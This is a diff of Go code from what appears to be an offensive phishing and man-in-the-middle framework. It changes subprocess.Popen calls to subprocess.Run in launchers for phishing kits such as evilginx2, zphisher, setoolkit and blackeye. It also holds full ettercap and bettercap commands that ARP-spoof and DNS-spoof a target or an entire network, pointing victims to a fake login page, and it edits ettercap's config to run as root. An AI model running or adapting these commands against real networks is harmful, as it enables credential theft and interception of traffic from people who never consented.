@@ -41,7 +41,7 @@ type stringMatcher struct {
 
 func PhishingPentest() {
     for {
-        fmt.Printf("%s%s%safr%s%s phishers(%s%ssrc/pentest_%s.fn%s)%s > %s", bcolors.Endc, bcolors.Underl, bcolors.Bold, subprocess.Version, bcolors.Endc, bcolors.Bold, bcolors.BrightRed, Function, bcolors.Endc, bcolors.BrightGreen, bcolors.Endc)
+        fmt.Printf("%s%s%safr%s%s phishers(%s%ssrc/pentest_%s.fn%s)%s > %s", bcolors.Endc, bcolors.Underline, bcolors.Bold, subprocess.Version, bcolors.Endc, bcolors.Bold, bcolors.BrightRed, Function, bcolors.Endc, bcolors.BrightGreen, bcolors.Endc)
         utils.Scanner.Scan()
         Input := strings.TrimSpace(utils.Scanner.Text())
         buildParts := strings.Fields(strings.ToLower(Input))
@@ -459,43 +459,43 @@ func PhishingPenFunctions(Function string, args ...interface{}) {
 }
 
 func GoPhish() {
-    subprocess.Popen(`gophish`)
+    subprocess.Run(`gophish`)
 }
 
 func GoodGinx() {
-    subprocess.Popen(`evilginx2`)
+    subprocess.Run(`evilginx2`)
 }
 
 func Thc() {
-    subprocess.Popen(`cd %s/thc/; bash ./thc.sh`, utils.PhishersTools)
+    subprocess.Run(`cd %s/thc/; bash ./thc.sh`, utils.PhishersTools)
 }
 
 func SetoolKit() {
-    subprocess.Popen(`cd %s/set/; python3 ./setoolkit`, utils.PhishersTools)
+    subprocess.Run(`cd %s/set/; python3 ./setoolkit`, utils.PhishersTools)
 }
 
 func ZPhisher() {
-    subprocess.Popen(`cd %s/zphisher/; bash ./zphisher.sh`, utils.PhishersTools)
+    subprocess.Run(`cd %s/zphisher/; bash ./zphisher.sh`, utils.PhishersTools)
 }
 
 func BlackEye() {
-    subprocess.Popen(`cd %s/blackeye/; bash ./blackeye.sh`, utils.PhishersTools)
+    subprocess.Run(`cd %s/blackeye/; bash ./blackeye.sh`, utils.PhishersTools)
 }
 
 func ShellPhish() {
-    subprocess.Popen(`cd %s/shellphish/; bash ./shellphish.sh`, utils.PhishersTools)
+    subprocess.Run(`cd %s/shellphish/; bash ./shellphish.sh`, utils.PhishersTools)
 }
 
 func DarkPhish() {
-    subprocess.Popen(`cd %s/darkphish/; python3 ./dark-phish.py`, utils.PhishersTools)
+    subprocess.Run(`cd %s/darkphish/; python3 ./dark-phish.py`, utils.PhishersTools)
 }
 
 func AdvPhisher() {
-    subprocess.Popen(`cd %s/advphishing/; bash ./advphishing.sh`, utils.PhishersTools)
+    subprocess.Run(`cd %s/advphishing/; bash ./advphishing.sh`, utils.PhishersTools)
 }
 
 func CyberPhish() {
-    subprocess.Popen(`cd %s/cyberphish/; python3 ./cyberphish.py`, utils.PhishersTools)
+    subprocess.Run(`cd %s/cyberphish/; python3 ./cyberphish.py`, utils.PhishersTools)
 }
 
 func NinjaEttercap(LHost, Gateway, PhFakeDns, RHost, IFace, Target string) {
@@ -503,7 +503,7 @@ func NinjaEttercap(LHost, Gateway, PhFakeDns, RHost, IFace, Target string) {
     case "one":
         filePathO := "/etc/ettercap/etter.conf.bak_africana"
         if _, err := os.Stat(filePathO); os.IsNotExist(err) {
-            subprocess.Popen(`cp -rf /etc/ettercap/etter.conf /etc/ettercap/etter.conf.bak_africana`)
+            subprocess.Run(`cp -rf /etc/ettercap/etter.conf /etc/ettercap/etter.conf.bak_africana`)
             filesToReplacements := map[string]map[string]string{
                 "/etc/ettercap/etter.conf": {
                     `ec_uid = 65534`: `ec_uid = 0`,
@@ -518,7 +518,7 @@ func NinjaEttercap(LHost, Gateway, PhFakeDns, RHost, IFace, Target string) {
         }
         filePathT := "/etc/ettercap/etter.dns.bak_africana"
         if _, err := os.Stat(filePathT); os.IsNotExist(err) {
-            subprocess.Popen(`cp -rf /etc/ettercap/etter.dns /etc/ettercap/etter.dns.bak_africana`)
+            subprocess.Run(`cp -rf /etc/ettercap/etter.dns /etc/ettercap/etter.dns.bak_africana`)
             newString  := fmt.Sprintf("# vim:ts=8:noexpandtab\n%s%s%s", utils.PhFakeDns, " A ", utils.LHost)
             filesToReplacements := map[string]map[string]string{
                 "/etc/ettercap/etter.dns": {
@@ -527,16 +527,16 @@ func NinjaEttercap(LHost, Gateway, PhFakeDns, RHost, IFace, Target string) {
             }
         utils.Editors(filesToReplacements)
         }
-        subprocess.Popen(`xterm -geometry 128x33 -T 'Glory be To Lord God Jesus Christ' -e "ettercap -TQi %s -M arp:remote -P dns_spoof /%s// /%s//" &`, IFace, utils.RHost, Gateway)
-        subprocess.Popen(`cd %s/blackeye; bash ./blackeye.sh`, utils.PhishersTools)
+        subprocess.Run(`xterm -geometry 128x33 -T 'Glory be To Lord God Jesus Christ' -e "ettercap -TQi %s -M arp:remote -P dns_spoof /%s// /%s//" &`, IFace, utils.RHost, Gateway)
+        subprocess.Run(`cd %s/blackeye; bash ./blackeye.sh`, utils.PhishersTools)
         fmt.Println()
-        subprocess.Popen(`rm -rf /etc/ettercap/etter.conf; rm -rf /etc/ettercap/etter.dns; mv /etc/ettercap/etter.conf.bak_africana /etc/ettercap/etter.conf; mv /etc/ettercap/etter.dns.bak_africana /etc/ettercap/etter.dns`)
+        subprocess.Run(`rm -rf /etc/ettercap/etter.conf; rm -rf /etc/ettercap/etter.dns; mv /etc/ettercap/etter.conf.bak_africana /etc/ettercap/etter.conf; mv /etc/ettercap/etter.dns.bak_africana /etc/ettercap/etter.dns`)
         return
 
     case "all":
         filePathO := "/etc/ettercap/etter.conf.bak_africana"
         if _, err := os.Stat(filePathO); os.IsNotExist(err) {
-            subprocess.Popen(`cp -rf /etc/ettercap/etter.conf /etc/ettercap/etter.conf.bak_africana`)
+            subprocess.Run(`cp -rf /etc/ettercap/etter.conf /etc/ettercap/etter.conf.bak_africana`)
             filesToReplacements := map[string]map[string]string{
                 "/etc/ettercap/etter.conf": {
                     `ec_uid = 65534`: `ec_uid = 0`,
@@ -552,7 +552,7 @@ func NinjaEttercap(LHost, Gateway, PhFakeDns, RHost, IFace, Target string) {
 
         filePathT := "/etc/ettercap/etter.dns.bak_africana"
         if _, err := os.Stat(filePathT); os.IsNotExist(err) {
-            subprocess.Popen(`cp -rf /etc/ettercap/etter.dns /etc/ettercap/etter.dns.bak_africana`)
+            subprocess.Run(`cp -rf /etc/ettercap/etter.dns /etc/ettercap/etter.dns.bak_africana`)
             newString  := fmt.Sprintf("# vim:ts=8:noexpandtab\n%s%s%s", utils.PhFakeDns, " A ", utils.LHost)
             filesToReplacements := map[string]map[string]string{
                 "/etc/ettercap/etter.dns": {
@@ -563,10 +563,10 @@ func NinjaEttercap(LHost, Gateway, PhFakeDns, RHost, IFace, Target string) {
         }
 
         fmt.Println()
-        subprocess.Popen(`xterm -geometry 128x33 -T 'Glory be To Lord God Jesus Christ' -e "ettercap -TQi %s -M arp:remote -P dns_spoof ///" &`, IFace)
-        subprocess.Popen(`cd %s/blackeye; bash ./blackeye.sh`, utils.PhishersTools)
+        subprocess.Run(`xterm -geometry 128x33 -T 'Glory be To Lord God Jesus Christ' -e "ettercap -TQi %s -M arp:remote -P dns_spoof ///" &`, IFace)
+        subprocess.Run(`cd %s/blackeye; bash ./blackeye.sh`, utils.PhishersTools)
         fmt.Println()
-        subprocess.Popen(`rm -rf /etc/ettercap/etter.conf; rm -rf /etc/ettercap/etter.dns; mv /etc/ettercap/etter.conf.bak_africana /etc/ettercap/etter.conf; mv /etc/ettercap/etter.dns.bak_africana /etc/ettercap/etter.dns`)
+        subprocess.Run(`rm -rf /etc/ettercap/etter.conf; rm -rf /etc/ettercap/etter.dns; mv /etc/ettercap/etter.conf.bak_africana /etc/ettercap/etter.conf; mv /etc/ettercap/etter.dns.bak_africana /etc/ettercap/etter.dns`)
         return
 
     default:
@@ -583,11 +583,11 @@ func NinjaBettercap(LHost, Gateway, PhFakeDns, RHost, IFace, Target string) {
     }
     switch strings.ToLower(Target) {
     case "one":
-        subprocess.Popen(`xterm -geometry 128x33 -T 'Glory be To Lord God Jesus Christ' -e "bettercap --iface %s -eval 'set $ {bold}(Jesus.is.❤. Type.exit.when.done) » {reset}; set arp.spoof.targets %s; set dns.spoof.domains *.*; set net.sniff.verbose true; arp.spoof on; dns.spoof on; active'"&`, IFace, utils.RHost)
-        subprocess.Popen(`cd %s/blackeye; bash ./blackeye.sh`, utils.PhishersTools)
+        subprocess.Run(`xterm -geometry 128x33 -T 'Glory be To Lord God Jesus Christ' -e "bettercap --iface %s -eval 'set $ {bold}(Jesus.is.❤. Type.exit.when.done) » {reset}; set arp.spoof.targets %s; set dns.spoof.domains *.*; set net.sniff.verbose true; arp.spoof on; dns.spoof on; active'"&`, IFace, utils.RHost)
+        subprocess.Run(`cd %s/blackeye; bash ./blackeye.sh`, utils.PhishersTools)
     case "all":
-        subprocess.Popen(`xterm -geometry 128x33 -T 'Glory be To Lord God Jesus Christ' -e "bettercap --iface %s -eval 'set $ {bold}(Jesus.is.❤. Type.exit.when.done) » {reset}; set dns.spoof.domains *.*; set net.sniff.verbose true; set dns.spoof.all true; arp.spoof on; dns.spoof on; active'"&`, IFace)
-        subprocess.Popen(`cd %s/blackeye; bash ./blackeye.sh`, utils.PhishersTools)
+        subprocess.Run(`xterm -geometry 128x33 -T 'Glory be To Lord God Jesus Christ' -e "bettercap --iface %s -eval 'set $ {bold}(Jesus.is.❤. Type.exit.when.done) » {reset}; set dns.spoof.domains *.*; set net.sniff.verbose true; set dns.spoof.all true; arp.spoof on; dns.spoof on; active'"&`, IFace)
+        subprocess.Run(`cd %s/blackeye; bash ./blackeye.sh`, utils.PhishersTools)
     default:
         fmt.Printf("\n%s[!] %sMissing required parameter TARGET. Use %s'help' %sfor details.\n", bcolors.BrightRed, bcolors.Endc, bcolors.BrightGreen, bcolors.Endc)
         return
